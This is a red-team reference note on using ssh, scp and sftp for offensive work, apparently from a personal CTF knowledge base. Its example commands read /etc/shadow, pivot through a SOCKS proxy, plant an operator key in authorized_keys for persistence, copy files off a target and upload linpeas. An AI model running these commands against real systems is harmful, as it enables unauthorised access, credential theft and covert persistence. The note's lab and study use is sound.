---
type: tool
room: red
tool_name: "ssh"
version: "OpenSSH 9.x"
platform: [Linux, Windows, macOS]
phase: [Lateral Movement, Persistence, Command and Control]
tags: [red/tool, red/lateral-movement, red/remote-access, tunnelling, pivoting]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# ssh / scp / sftp

> [!quote]
> *"When you have eliminated the impossible, whatever remains, however improbable, must be the truth."*
> — *The Sign of the Four*

**Room:** Red — Instruments | **Phase(s):** `Lateral Movement, Persistence` | **Platform:** `Linux, Windows, macOS`

---

## The Instrument *(What It Is)*

OpenSSH (Secure Shell) provides encrypted remote administrative access, secure file copying (`scp`, `sftp`), and versatile network tunnelling capabilities. In offensive tradecraft, SSH serves as an indispensable tool for establishing interactive shells, staging payloads, pivoting into internal subnets, and exfiltrating data through encrypted tunnels.

- **Author / Origin:** Tatu Ylönen / OpenBSD Project
- **License:** BSD / Open Source
- **Install:** Default on Linux/macOS; Windows Feature: `OpenSSH Client`

---

## The Method *(Core Usage)*

### Basic Syntax
```bash
ssh [options] <user>@<host> [command]
scp [options] <src> <dest>
sftp [options] <user>@<host>
```

### Key Flags (`ssh`)

| Flag | Meaning |
|------|---------|
| `-i <identity_file>` | Select private key file for authentication (e.g. `id_ed25519`) |
| `-p <port>` | Non-default SSH port |
| `-L <local>:<host>:<port>` | Local Port Forwarding: listen locally, forward through remote |
| `-R <remote>:<host>:<port>` | Remote Port Forwarding: listen on remote host, forward to local |
| `-D <port>` | Dynamic SOCKS5 Proxy: pivot through remote host |
| `-J <bastion>` | Jump host / proxy jump |
| `-N` | Do not execute remote command (port forwarding only) |
| `-f` | Fork into background just before command execution |
| `-q` | Quiet mode |
| `-o <option>` | Override `ssh_config` setting (e.g. `-o StrictHostKeyChecking=no`) |

---

## The Cases *(Common Use-Patterns)*

### Case 1 — Remote Command Execution Without Shell
```bash
# Execute non-interactive command and print output locally
ssh mark@10.10.10.50 "uname -r; id; cat /etc/shadow 2>/dev/null"
```

### Case 2 — Pivoting: Dynamic SOCKS5 Proxy
```bash
# Open local SOCKS5 proxy on port 9050 routing through compromised host
ssh -D 9050 -N -f mark@10.10.10.50

# Use with proxychains to scan internal subnet
proxychains nmap -sT -Pn 172.16.0.0/24
```

### Case 3 — Local Port Forwarding (Bypass Firewalls)
```bash
# Expose internal MySQL port (3306) on localhost:3307
ssh -L 3307:127.0.0.1:3306 -N mark@10.10.10.50
mysql -h 127.0.0.1 -P 3307 -u root -p
```

### Case 4 — Key Generation & Persistence
```bash
# Generate high-security Ed25519 key pair
ssh-keygen -t ed25519 -C "operator@mindpalace" -f ~/.ssh/id_ed25519_pers

# Deploy public key into target's authorized_keys for passwordless persistence
ssh-copy-id -i ~/.ssh/id_ed25519_pers.pub mark@10.10.10.50
# OR manual injection:
echo "ssh-ed25519 AAAAC3... operator@mindpalace" >> ~/.ssh/authorized_keys
```

### Case 5 — Secure File Transfer (`scp` & `sftp`)
```bash
# Exfiltrate file from remote to local
scp -i ~/.ssh/id_ed25519 mark@10.10.10.50:/home/mark/evidence.tar.gz ./

# Upload exploit script to remote /tmp
scp -P 2222 linpeas.sh mark@10.10.10.50:/tmp/linpeas.sh
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1021.004` | Remote Services: SSH |
| `T1090.001` | Proxy: Internal Proxy |
| `T1090.002` | Proxy: External Proxy |
| `T1098.004` | Account Manipulation: SSH Authorized Keys |

---

## Gotchas & Caveats

> [!warning] Common Mistakes
> - **Permissions on Key Files:** OpenSSH enforces strict file permissions. Private keys MUST be mode `600` (`chmod 600 id_ed25519`), and `~/.ssh` directory must be `700`. Loose permissions cause auth failure.
> - **Host Key Verification Failure:** If the target IP was reused, SSH warns of host key changes. In CTFs/labs, bypass with `-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no`.

---

## OPSEC Notes

- Authentication attempts and commands are logged to `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS).
- Active connections leave records in `w`, `who`, and `last`.
- Modifying `authorized_keys` leaves filesystem timestamp anomalies (`mtime`).

---

## Related Notes

- [[Red/Instruments/chisel|chisel]]
- [[Red/Monographs/TA0008 - Lateral Movement|TA0008 — Lateral Movement]]
- [[Casebook/Labs/TryHackMe/THM - Protocols and Servers 2|THM — Protocols and Servers 2]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
